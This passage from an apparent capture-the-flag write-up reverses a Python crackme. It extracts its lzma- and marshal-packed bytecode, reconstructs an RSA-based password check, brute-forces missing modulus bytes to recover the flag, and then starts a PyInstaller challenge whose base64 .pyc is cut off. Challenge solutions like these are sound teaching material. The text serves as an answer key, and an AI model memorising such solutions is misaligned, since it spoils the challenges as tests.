b32decodedstr = base64_b32decode(transformedstr)

i_lzma = g_import('lzma')
g_list = g['list']
lzma_decompress = g_vars(i_lzma)['decompress']
decompressedstr = lzma_decompress(b32decodedstr)

len_argv = g_len(sys_argv)
g_bytes = g['bytes']

# need 2 args
if len_argv < 2:
    g_print('Not enough arguments')
    sys_exit(1)

arg1 = sys_argv[1]
seven = 7
g_eval = g['eval']
len_arg1 = g_len(arg1)

# len(arg1) >= 7
if len_arg1 < seven:
    g_print('arg is too short')
    sys_exit(1)

list_decompressedstr = g_list(decompressedstr)
list_decompressedstr[235] = g_ord(arg1[0])
list_decompressedstr[515] = g_ord(arg1[1])
list_decompressedstr[507] = g_ord(arg1[2])
list_decompressedstr[519] = g_ord(arg1[3])
list_decompressedstr[1552] = g_ord(arg1[4])
list_decompressedstr[1586] = g_ord(arg1[5])
list_decompressedstr[1617] = g_ord(arg1[6])

bytes_decompressedstr = g_bytes(list_decompressedstr)
i_marshal = g_import('marshal')
marshal_loads = g_vars(i_marshal)['loads']
marshaledstr = marshal_loads(bytes_decompressedstr)

try:
    g_eval(marshaledstr)
except:
    g_print('This is very unstable, huh?')
    sys_exit(1)
```
</details>

#### Bytecode extraction
Upon inspection, we can see that there is another compiled code embedded inside. Notice the code is modified slightly in 7 places depends on the password provided.<br>
We do an initial analysis by extracting the logic in original script using a password with all zeros. Then disassemble the bytecode with `dis.dis()`.
<details>
<summary>Initial bytecode extraction script</summary>

```py
import dis
import atexit
import re
import math
import base64
import lzma
import marshal

arg1 = None

with open("stable.ori.py", 'r') as f:
    orisos = f.read()

r = re.findall('_?([^\n?\\[\\]\']+?)\\s=', orisos)
joined_str = ''.join(r)
transformedstr = str.ljust(joined_str, math.ceil(len(joined_str) / 8) * 8, chr(61))
b32decodedstr = base64.b32decode(transformedstr)
decompressedstr = lzma.decompress(b32decodedstr)

list_decompressedstr = list(decompressedstr)

atexit.register(lambda: print(dis.dis(code)))
pwd = [0] * 7
list_decompressedstr[235] = pwd[0]
list_decompressedstr[515] = pwd[1]
list_decompressedstr[507] = pwd[2]
list_decompressedstr[519] = pwd[3]
list_decompressedstr[1552] = pwd[4]
list_decompressedstr[1586] = pwd[5]
list_decompressedstr[1617] = pwd[6]

bytes_decompressedstr = bytes(list_decompressedstr)
code = marshal.loads(bytes_decompressedstr)

try:
    r = eval(code)
except Exception:
    pass

print(r)
```
</details>


#### Source recovery
All decompilation tools fail with ``Parse error at or near `COME_FROM' instruction at offset 234_0`` so we can only proceed with manual recovery.
We first identify the parts that are changed along with the password by changing one character at a time and diffing the disassembly, marking the changed parts along the way.
<details>
<summary>Marked disassembly</summary>

```py
  1           0 LOAD_CONST               0 (10000)
              2 STORE_NAME               0 (pad)

  2           4 LOAD_CONST               1 (10001)
              6 STORE_NAME               0 (pad)

  3           8 LOAD_CONST               2 (10002)
             10 STORE_NAME               0 (pad)

  4          12 LOAD_CONST               3 (10003)
             14 STORE_NAME               0 (pad)

  5          16 LOAD_CONST               4 (10004)
             18 STORE_NAME               0 (pad)

  6          20 LOAD_CONST               5 (10005)
             22 STORE_NAME               0 (pad)

  7          24 LOAD_CONST               6 (10006)
             26 STORE_NAME               0 (pad)

  8          28 LOAD_CONST               7 (10007)
             30 STORE_NAME               0 (pad)

  9          32 LOAD_CONST               8 (10008)
             34 STORE_NAME               0 (pad)

 10          36 LOAD_CONST               9 (10009)
             38 STORE_NAME               0 (pad)

 11          40 LOAD_CONST              10 (100010)
             42 STORE_NAME               0 (pad)

 12          44 LOAD_CONST              11 (100011)
             46 STORE_NAME               0 (pad)

 13          48 LOAD_CONST              12 (100012)
             50 STORE_NAME               0 (pad)

 14          52 LOAD_CONST              13 (100013)
             54 STORE_NAME               0 (pad)

 15          56 LOAD_CONST              14 (100014)
             58 STORE_NAME               0 (pad)

 16          60 LOAD_CONST              15 (100015)
             62 STORE_NAME               0 (pad)

 17          64 LOAD_CONST              16 (100016)
             66 STORE_NAME               0 (pad)

 18          68 LOAD_CONST              17 (100017)
             70 STORE_NAME               0 (pad)

 19          72 LOAD_CONST              18 (100018)
             74 STORE_NAME               0 (pad)

 20          76 LOAD_CONST              19 (100019)
             78 STORE_NAME               0 (pad)

 21          80 LOAD_CONST              20 (100020)
             82 STORE_NAME               0 (pad)

 22          84 LOAD_CONST              21 (100021)
             86 STORE_NAME               0 (pad)

 23          88 LOAD_CONST              22 (100022)
             90 STORE_NAME               0 (pad)

 24          92 LOAD_CONST              23 (100023)
             94 STORE_NAME               0 (pad)

 25          96 LOAD_CONST              24 (100024)
             98 STORE_NAME               0 (pad)

 26         100 LOAD_CONST              25 (100025)
            102 STORE_NAME               0 (pad)

 27         104 LOAD_CONST              26 (100026)
            106 STORE_NAME               0 (pad)

 28         108 LOAD_CONST              27 (100027)
            110 STORE_NAME               0 (pad)

 29         112 LOAD_CONST              28 (100028)
            114 STORE_NAME               0 (pad)

 30         116 LOAD_CONST              29 (100029)
            118 STORE_NAME               0 (pad)

 31         120 LOAD_CONST              30 (100030)
            122 STORE_NAME               0 (pad)

 32         124 LOAD_CONST              31 (100031)
            126 STORE_NAME               0 (pad)

 33         128 LOAD_CONST              32 (100032)
            130 STORE_NAME               0 (pad)

 34         132 LOAD_CONST              33 (100033)
            134 STORE_NAME               0 (pad)

 35         136 LOAD_CONST              34 (100034)
            138 STORE_NAME               0 (pad)

 36         140 LOAD_CONST              35 (100035)
            142 STORE_NAME               0 (pad)

 37         144 LOAD_CONST              36 (100036)
            146 STORE_NAME               0 (pad)

 38         148 LOAD_CONST              37 (100037)
            150 STORE_NAME               0 (pad)

 39         152 LOAD_CONST              38 (100038)
            154 STORE_NAME               0 (pad)

 40         156 LOAD_CONST              39 (100039)
            158 STORE_NAME               0 (pad)

 41         160 LOAD_CONST              40 (100040)
            162 STORE_NAME               0 (pad)

 42         164 LOAD_CONST              41 (100041)
            166 STORE_NAME               0 (pad)

 43         168 LOAD_CONST              42 (100042)
            170 STORE_NAME               0 (pad)

 44         172 LOAD_CONST              43 (100043)
            174 STORE_NAME               0 (pad)

 45         176 LOAD_CONST              44 (100044)
            178 STORE_NAME               0 (pad)

 46         180 LOAD_CONST              45 (100045)
            182 STORE_NAME               0 (pad)

 47         184 LOAD_CONST              46 (100046)
            186 STORE_NAME               0 (pad)

 48         188 LOAD_CONST              47 (100047)
            190 STORE_NAME               0 (pad)

 49         192 LOAD_CONST              48 (100048)
            194 STORE_NAME               0 (pad)

 50         196 LOAD_CONST              49 (100049)
            198 STORE_NAME               0 (pad)

 51         200 LOAD_CONST              50 (100050)
            202 STORE_NAME               0 (pad)

 52         !204 LOAD_CONST               0 (10000)
            206 STORE_NAME               0 (pad)

 53         208 LOAD_CONST              52 (100052)
            210 STORE_NAME               0 (pad)

 54         212 LOAD_CONST              53 (100053)
            214 STORE_NAME               0 (pad)

 55         216 LOAD_CONST              54 (100054)
            218 STORE_NAME               0 (pad)

 56         220 LOAD_CONST              55 (100055)
            222 STORE_NAME               0 (pad)

 57         224 LOAD_CONST              56 (100056)
            226 STORE_NAME               0 (pad)

 58         228 LOAD_CONST              57 (100057)
            230 STORE_NAME               0 (pad)

 59         232 LOAD_CONST              58 (100058)
        >>  234 STORE_NAME               0 (pad)

 60         236 LOAD_CONST              59 (100059)
            238 STORE_NAME               0 (pad)

 61         240 LOAD_CONST              60 (100060)
            242 STORE_NAME               0 (pad)

 62         244 LOAD_CONST              61 (100061)
            246 STORE_NAME               0 (pad)

 63         248 LOAD_CONST              62 (100062)
            250 STORE_NAME               0 (pad)

 64         252 LOAD_CONST              63 (100063)
            254 STORE_NAME               0 (pad)

 65         256 LOAD_CONST              64 (100064)
            258 STORE_NAME               0 (pad)

 66         260 LOAD_CONST              65 (100065)
            262 STORE_NAME               0 (pad)

 67         264 LOAD_CONST              66 (100066)
            266 STORE_NAME               0 (pad)

 68         268 LOAD_CONST              67 (100067)
            270 STORE_NAME               0 (pad)

 69         272 LOAD_CONST              68 (100068)
            274 STORE_NAME               0 (pad)

 70         276 LOAD_CONST              69 (100069)
            278 STORE_NAME               0 (pad)

 71         280 LOAD_CONST              70 (100070)
            282 STORE_NAME               0 (pad)

 72         284 LOAD_CONST              71 (100071)
            286 STORE_NAME               0 (pad)

 73         288 LOAD_CONST              72 (100072)
            290 STORE_NAME               0 (pad)

 74         292 LOAD_CONST              73 (100073)
            294 STORE_NAME               0 (pad)

 75         296 LOAD_CONST              74 (100074)
            298 STORE_NAME               0 (pad)

 76         300 LOAD_CONST              75 (100075)
            302 STORE_NAME               0 (pad)

 77         304 LOAD_CONST              76 (100076)
            306 STORE_NAME               0 (pad)

 78         308 LOAD_CONST              77 (100077)
            310 STORE_NAME               0 (pad)

 79         312 LOAD_CONST              78 (100078)
            314 STORE_NAME               0 (pad)

 80         316 LOAD_CONST              79 (100079)
            318 STORE_NAME               0 (pad)

 81         320 LOAD_CONST              80 (100080)
            322 STORE_NAME               0 (pad)

 82         324 LOAD_CONST              81 (100081)
            326 STORE_NAME               0 (pad)

 83         328 LOAD_CONST              82 (100082)
            330 STORE_NAME               0 (pad)

 84         332 LOAD_CONST              83 (100083)
            334 STORE_NAME               0 (pad)

 85         336 LOAD_CONST              84 (100084)
            338 STORE_NAME               0 (pad)

 86         340 LOAD_CONST              85 (100085)
            342 STORE_NAME               0 (pad)

 87         344 LOAD_CONST              86 (100086)
            346 STORE_NAME               0 (pad)

 88         348 LOAD_CONST              87 (100087)
            350 STORE_NAME               0 (pad)

 89         352 LOAD_CONST              88 (100088)
            354 STORE_NAME               0 (pad)

 90         356 LOAD_CONST              89 (100089)
            358 STORE_NAME               0 (pad)

 91         360 LOAD_CONST              90 (100090)
            362 STORE_NAME               0 (pad)

 92         364 LOAD_CONST              91 (100091)
            366 STORE_NAME               0 (pad)

 93         368 LOAD_CONST              92 (100092)
            370 STORE_NAME               0 (pad)

 94         372 LOAD_CONST              93 (100093)
            374 STORE_NAME               0 (pad)

 95         376 LOAD_CONST              94 (100094)
            378 STORE_NAME               0 (pad)

 96         380 LOAD_CONST              95 (100095)
            382 STORE_NAME               0 (pad)

 97         384 LOAD_CONST              96 (100096)
            386 STORE_NAME               0 (pad)

 98         388 LOAD_CONST              97 (100097)
            390 STORE_NAME               0 (pad)

 99         392 LOAD_CONST              98 (100098)
            394 STORE_NAME               0 (pad)

100         396 LOAD_CONST              99 (100099)
            398 STORE_NAME               0 (pad)

101         400 LOAD_CONST             100 (0)
            402 LOAD_CONST             101 (('argv', 'exit'))
            404 IMPORT_NAME              1 (sys)
            406 IMPORT_FROM              2 (argv)
            408 STORE_NAME               2 (argv)
            410 IMPORT_FROM              3 (exit)
            412 STORE_NAME               3 (exit)
            414 POP_TOP

102         416 LOAD_CONST             100 (0)
            418 LOAD_CONST             102 (('sha256',))
            420 IMPORT_NAME              4 (hashlib)
            422 IMPORT_FROM              5 (sha256)
            424 STORE_NAME               5 (sha256)
            426 POP_TOP

104         428 LOAD_NAME                6 (len)
            430 LOAD_NAME                2 (argv)
            432 CALL_FUNCTION            1
            434 LOAD_CONST             103 (2)
            436 COMPARE_OP               0 (<)
            438 POP_JUMP_IF_FALSE      234

105         440 LOAD_NAME                7 (print)
            442 LOAD_CONST             104 ('Usage: ')
            444 LOAD_NAME                2 (argv)
            446 LOAD_CONST             100 (0)
            448 BINARY_SUBSCR
            450 FORMAT_VALUE             0
            452 LOAD_CONST             105 (' <passwd>')
            454 BUILD_STRING             3
            456 CALL_FUNCTION            1
            458 POP_TOP

106         460 LOAD_NAME                3 (exit)
            462 LOAD_CONST             106 (1)
            464 CALL_FUNCTION            1
            466 POP_TOP

108         468 LOAD_NAME                2 (argv)
            470 LOAD_CONST             106 (1)
            472 BINARY_SUBSCR
            474 STORE_NAME               8 (passwd)

112         !476 LOAD_CONST               0 (10000)
            478 STORE_NAME               9 (enc_flag)

113         480 LOAD_CONST             108 (14577897362821085283869313971595837572237381973528035997480016212662401635116)
            482 STORE_NAME              10 (flag_hash)

116         !484 LOAD_CONST               0 (10000)
            486 STORE_NAME              11 (e1)

117         !488 LOAD_CONST               0 (10000)
            490 LOAD_NAME               11 (e1)
            492 BINARY_ADD
            494 STORE_NAME              12 (e)

120         496 LOAD_NAME               13 (int)
            498 LOAD_METHOD             14 (from_bytes)
            /500 LOAD_CONST             110 (b'\x96094\xdc\x1e\xd0\xe0\xa5\xabs\x16\xcb\x00\xb5\xed\x04\xa2\xd8\xb0\x86_6\xdf\x8c\x81G#\xcc\x0b8\xfe[\x93\xae\x97\xa9T\x8d\x99\xe1Yj\xf2\xb2\x1e\xcf\x00\x93J\xd8\x81\xe9\x1fO\x84T?J\x9f\xaat\x05p>\xc8\x12\xf71wh\x13\xef\x9d\x7f\xf7\xcb\x86\x00\x08\xf4I\x0f\xa7\x0e\xb9re\xd3_\xfa\xcd\xd1\xbfv\xcfB\x9a\x13\xcfx\xfd\xb4D/\xe914;\xf2c\xee\x96:\xf8 \xf9\xf6g\x8c\xd3\xfa\xcd\xb13\xb9\xdf\x04w\x0cF\xb4\xb6\xf8\x88\x02re\xe2Oq\xa56\xe1v7\x0b\xd2\xe6\xe0\xc4+\xb8\xdfH\xd9\xa8u\x8d\xa1\xd7]\xd5\xff\x81\xb6\x15\xfc\x89a#\xc8@\xdc,\xb0\xa9\x1e\xdc\xe84x\x94\xcb\x8dP\x15\x0br\x8d8\x9f\x9cHN\xa6\x08_\xf0\xc2\x1cF\xd6p;\xb1r\xcf\x94\xf8\x92]\xddq\xdc?\xea\xc7\xb6\xffN\x06AhL\xeb\xb0\xe2\xf7\xdcG\x08S5\xc2\xaa\xcd<J\x99\x8a\xae\xad\xcdO\x00\x19\x1e%x}e\x00\xbf5\x8d')        
            502 LOAD_CONST             111 ('big')
            504 CALL_METHOD              2
            506 STORE_NAME              15 (n)

128         508 LOAD_CONST             112 (<code object encrypt at 0x0000024080C00C90, file "<string>", line 128>)
            510 LOAD_CONST             113 ('encrypt')
            512 MAKE_FUNCTION            0
            514 STORE_NAME              16 (encrypt)

138         516 LOAD_NAME               16 (encrypt)
            518 LOAD_NAME                9 (enc_flag)
            520 CALL_FUNCTION            1
            522 STORE_NAME              17 (dec_flag)

140         524 LOAD_NAME                5 (sha256)
            526 LOAD_NAME               17 (dec_flag)
            528 CALL_FUNCTION            1
            530 LOAD_METHOD             18 (digest)
            532 CALL_METHOD              0
            534 STORE_NAME              19 (h)

141         536 LOAD_NAME               13 (int)
            538 LOAD_METHOD             14 (from_bytes)
            540 LOAD_NAME               19 (h)
            542 LOAD_CONST             111 ('big')
            544 CALL_METHOD              2
            546 STORE_NAME              19 (h)

143         548 LOAD_NAME               19 (h)
            550 LOAD_NAME               10 (flag_hash)
            552 COMPARE_OP               2 (==)
            554 EXTENDED_ARG             1
            556 POP_JUMP_IF_FALSE      297

144         558 LOAD_NAME                7 (print)
            560 LOAD_CONST             114 ('Correct password: ')
            562 LOAD_NAME                8 (passwd)
            564 FORMAT_VALUE             0
            566 BUILD_STRING             2
            568 CALL_FUNCTION            1
            570 POP_TOP

145         572 LOAD_NAME                7 (print)
            574 LOAD_CONST             115 ('Flag: ')
            576 LOAD_NAME               17 (dec_flag)
            578 LOAD_METHOD             20 (decode)
            580 CALL_METHOD              0
            582 FORMAT_VALUE             0
            584 BUILD_STRING             2
            586 CALL_FUNCTION            1
            588 POP_TOP
            590 LOAD_CONST             118 (None)
            592 RETURN_VALUE

147         594 LOAD_NAME                7 (print)
            596 LOAD_CONST             116 ('Wrong password: ')
            598 LOAD_NAME                8 (passwd)
            600 FORMAT_VALUE             0
            602 BUILD_STRING             2
            604 CALL_FUNCTION            1
            606 POP_TOP

148         608 LOAD_NAME                7 (print)
            610 LOAD_CONST             117 ('Try again')
            612 CALL_FUNCTION            1
            614 POP_TOP
            616 LOAD_CONST             118 (None)
            618 RETURN_VALUE

Disassembly of <code object encrypt at 0x0000024080C00C90, file "<string>", line 128>:
128           0 LOAD_GLOBAL              0 (pow)
              2 LOAD_FAST                0 (m)
              4 LOAD_GLOBAL              1 (e)
              6 LOAD_GLOBAL              2 (n)
              8 CALL_FUNCTION            3
             10 STORE_FAST               1 (c)

130          12 LOAD_FAST                1 (c)
             14 LOAD_METHOD              3 (to_bytes)
             16 LOAD_FAST                1 (c)
             18 LOAD_METHOD              4 (bit_length)
             20 CALL_METHOD              0
             22 LOAD_CONST               1 (7)
             24 BINARY_ADD
             26 LOAD_CONST               2 (8)
             28 BINARY_FLOOR_DIVIDE
             30 LOAD_CONST               3 ('big')
             32 CALL_METHOD              2
             34 RETURN_VALUE
```
</details>

Then, by going through each part we try to make an educated guess for the values:
1. Index 235 points to instruction offset 204, which has the following disassembly:
    ```py
    51         200 LOAD_CONST              50 (100050)
               202 STORE_NAME               0 (pad)

    52         204 LOAD_CONST               0 (10000)
               206 STORE_NAME               0 (pad)

    53         208 LOAD_CONST              52 (100052)
               210 STORE_NAME               0 (pad)
    ```
    We can easily infer that the value to be `51`.
2. Index 507 points to instruction offset 476, which has the following disassembly:
    ```py
    112         476 LOAD_CONST               0 (10000)
                478 STORE_NAME               9 (enc_flag)

    113         480 LOAD_CONST             108 (14577897...)
                482 STORE_NAME              10 (flag_hash)
    ```
    It is a constant index for the encoded flag, `enc_flag`.
    Looking at the constants table (by using `code.co_consts` or `dis.code_info(code)`), we can see that there're only 2 large numbers:
    ```py
    107: 971142456500437723268...
    108: 145778973628210852838...
    ```
    Since 108th constant is already used as `flag_hash`, so we can infer that the encoded flag is most likely the `107`th constant.
3. Index 515 and 519 respectively points to instruction offset 484 and 488, which has the following disassembly:
    ```py
    116         484 LOAD_CONST               0 (10000)
                486 STORE_NAME              11 (e1)

    117         488 LOAD_CONST               0 (10000)
                490 LOAD_NAME               11 (e1)
                492 BINARY_ADD
                494 STORE_NAME              12 (e)
    ```
    Both of constants they refer to are going to be added together to form the RSA exponent `e`. There are a lot of integers in the constants table so we just collect all of them and do a brute-force search.
    <details>
    <summary>Script to bruteforce <code>e</code></summary>

    ```py
    from itertools import product
    from gmpy2 import is_prime
    from functools import lru_cache

    ALLINTS = (10000, 10001, 10002, 10003, 10004, 10005, 10006, 10007, 10008, 10009, 100010, 100011, 100012, 100013, 100014, 100015, 100016, 100017, 100018, 100019, 100020, 100021, 100022, 100023, 100024, 100025, 100026, 100027, 100028, 100029, 100030, 100031, 100032, 100033, 100034, 100035, 100036, 100037, 100038, 100039, 100040, 100041, 100042, 100043, 100044, 100045, 100046, 100047, 100048, 100049, 100050, 100051, 100052, 100053, 100054, 100055, 100056, 100057, 100058, 100059, 100060, 100061, 100062, 100063, 100064, 100065, 100066, 100067, 100068, 100069, 100070, 100071, 100072, 100073, 100074, 100075, 100076, 100077, 100078, 100079, 100080, 100081, 100082, 100083, 100084, 100085, 100086, 100087, 100088, 100089, 100090, 100091, 100092, 100093, 100094,
            100095, 100096, 100097, 100098, 100099, 0, 2, 1, -34514)

    @lru_cache(maxsize=100000)
    def memoisprime(n: int) -> bool:
        return is_prime(n)

    print("Start")
    pairs = set()
    for a, b in product(ALLINTS, repeat=2):
        s = a + b
        if memoisprime(s):
            if not (s, b, a) in pairs:
                pairs.add((s, a, b))
    print(pairs)
    print("End")
    ```
    </details>

    Of all combinations, `100051 + -34514 = 65537` caught the eye because it's the most common RSA exponent value. So we settle them as `51` and `109`.
4. The remaining index (1552, 1586, 1617) points to 3 bytes inside the encoded RSA modulus `n` (instruction offset 110). So we have no choice but to bruteforce them later.

Having these values, is it now possible to reconstruct the source manually from the bytecode.
<details>
<summary>Reconstructed source</summary>

```py
from sys import argv, exit
from hashlib import sha256

# need 1 arg
if len(argv) < 2:
    print(f"Usage: {argv[0]} <passwd>")
    exit(1)

passwd = argv[1]
enc_flag = 9711424565004377232685487241741130660537817718394316136522340067127964227885525022420001661646939496718599540608081579347013032655061764133877156925827123786333371798400278520894719018619930240463131452457577184074345537847657937111838070040487887401817080124695053692442303799118926077741439148690994150505024166983196233674022816843702592633467144395379448888439860974578091544834372961055549393844525096383940669190823316777609479779106281969726063297357182244423570155395852153018645790744470507852109998305853670898441956711998028819529790437018901157587797430995171274861607645732279735938817560714148831826813
flag_hash = 14577897362821085283869313971595837572237381973528035997480016212662401635116

e1 = ...
e = e1 + ...

n = int.from_bytes(
    b'\x96094\xdc\x1e\xd0\xe0\xa5\xabs\x16\xcb'
    b'\x00'
    b'\xb5\xed\x04\xa2\xd8\xb0\x86_6\xdf\x8c\x81G#\xcc\x0b8\xfe[\x93\xae\x97\xa9T\x8d\x99\xe1Yj\xf2\xb2\x1e\xcf'
    b'\x00'
    b'\x93J\xd8\x81\xe9\x1fO\x84T?J\x9f\xaat\x05p>\xc8\x12\xf71wh\x13\xef\x9d\x7f\xf7\xcb\x86'
    b'\x00'
    b'\x08\xf4I\x0f\xa7\x0e\xb9re\xd3_\xfa\xcd\xd1\xbfv\xcfB\x9a\x13\xcfx\xfd\xb4D/\xe914;\xf2c\xee\x96:\xf8 \xf9\xf6g\x8c\xd3\xfa\xcd\xb13\xb9\xdf\x04w\x0cF\xb4\xb6\xf8\x88\x02re\xe2Oq\xa56\xe1v7\x0b\xd2\xe6\xe0\xc4+\xb8\xdfH\xd9\xa8u\x8d\xa1\xd7]\xd5\xff\x81\xb6\x15\xfc\x89a#\xc8@\xdc,\xb0\xa9\x1e\xdc\xe84x\x94\xcb\x8dP\x15\x0br\x8d8\x9f\x9cHN\xa6\x08_\xf0\xc2\x1cF\xd6p;\xb1r\xcf\x94\xf8\x92]\xddq\xdc?\xea\xc7\xb6\xffN\x06AhL\xeb\xb0\xe2\xf7\xdcG\x08S5\xc2\xaa\xcd<J\x99\x8a\xae\xad\xcdO\x00\x19\x1e%x}e\x00\xbf5\x8d',
    "big")


def encrypt(m):
    c = pow(m, e, n)
    return c.to_bytes(c.bit_length() + 7 // 8, 'big')


dec_flag = encrypt(enc_flag)
h = sha256(dec_flag).digest()

if h == flag_hash:
    print(f"Correct password: {passwd}")
    print(f"Flag: {dec_flag.decode()}")
else:
    print(f"Wrong password: {passwd}")
    print("Try again")
```
</details>

#### Bruteforcing the password
Lastly, we write a script to brute-force the 3 bytes in `n`.
<details>
<summary>Example script to brute-force <code>n</code> and get the flag</summary>

```py
from hashlib import sha256
import itertools
import atexit

enc_flag = 9711424565004377232685487241741130660537817718394316136522340067127964227885525022420001661646939496718599540608081579347013032655061764133877156925827123786333371798400278520894719018619930240463131452457577184074345537847657937111838070040487887401817080124695053692442303799118926077741439148690994150505024166983196233674022816843702592633467144395379448888439860974578091544834372961055549393844525096383940669190823316777609479779106281969726063297357182244423570155395852153018645790744470507852109998305853670898441956711998028819529790437018901157587797430995171274861607645732279735938817560714148831826813
flag_digest = "203acc299f66961898e41b2b526d91ef9655fcbfa38b0c846f440ced42f0132c"

def encrypt(m, e, n):
    c = pow(m, e, n)
    return c.to_bytes(c.bit_length() + 7 // 8, 'big')

atexit.register(lambda: print("Combs", a, b, c))
print("Trying")
e = 65537
lasta = None
for a, b, c in itertools.product(range(128), range(128), range(128)):
    if a != lasta:
        print("cur", a, b, c)
        lasta = a
    bytesn = b'\x96094\xdc\x1e\xd0\xe0\xa5\xabs\x16\xcb\x00\xb5\xed\x04\xa2\xd8\xb0\x86_6\xdf\x8c\x81G#\xcc\x0b8\xfe[\x93\xae\x97\xa9T\x8d\x99\xe1Yj\xf2\xb2\x1e\xcf\x00\x93J\xd8\x81\xe9\x1fO\x84T?J\x9f\xaat\x05p>\xc8\x12\xf71wh\x13\xef\x9d\x7f\xf7\xcb\x86\x00\x08\xf4I\x0f\xa7\x0e\xb9re\xd3_\xfa\xcd\xd1\xbfv\xcfB\x9a\x13\xcfx\xfd\xb4D/\xe914;\xf2c\xee\x96:\xf8 \xf9\xf6g\x8c\xd3\xfa\xcd\xb13\xb9\xdf\x04w\x0cF\xb4\xb6\xf8\x88\x02re\xe2Oq\xa56\xe1v7\x0b\xd2\xe6\xe0\xc4+\xb8\xdfH\xd9\xa8u\x8d\xa1\xd7]\xd5\xff\x81\xb6\x15\xfc\x89a#\xc8@\xdc,\xb0\xa9\x1e\xdc\xe84x\x94\xcb\x8dP\x15\x0br\x8d8\x9f\x9cHN\xa6\x08_\xf0\xc2\x1cF\xd6p;\xb1r\xcf\x94\xf8\x92]\xddq\xdc?\xea\xc7\xb6\xffN\x06AhL\xeb\xb0\xe2\xf7\xdcG\x08S5\xc2\xaa\xcd<J\x99\x8a\xae\xad\xcdO\x00\x19\x1e%x}e\x00\xbf5\x8d'
    bytesn = bytearray(bytesn)
    bytesn[13] = a
    bytesn[47] = b
    bytesn[78] = c
    n = int.from_bytes(bytesn, "big")
    dec_flag = encrypt(enc_flag, e, n)
    if b"wgmy" in dec_flag:
        print("Combs", a, b, c)
        print(f"Possible Flag: {dec_flag}")
    h = sha256(dec_flag).hexdigest()
    if h == flag_digest:
        print("Combs", a, b, c)
        print(f"Flag: {dec_flag.decode()}")
print("Finished")
```
</details>

A while later, we are able to obtain the valid byte combination (122, 82, 41) and the flag `wgmy{bc2d2a189608a8614e99afdd49bc5c49}`!

### Ular
> Apa tu ular.exe?? Ada gambar ular

[*Back to top*](#table-of-contents)

`ular.exe`, a PyInstaller generated executable file with gambar ular (default icon) was provided.

#### Extracting python files
To start off, we first need to get the python files from the executable. This can be achieved easily by using tools such as [pyinstxtractor](https://pyinstxtractor-web.netlify.app/).

Along with the extracted files are a bunch of standard libraries and `ular.pyc`.
<details>
<summary>Base64 encoded <code>ular.pyc</code></summary>

```
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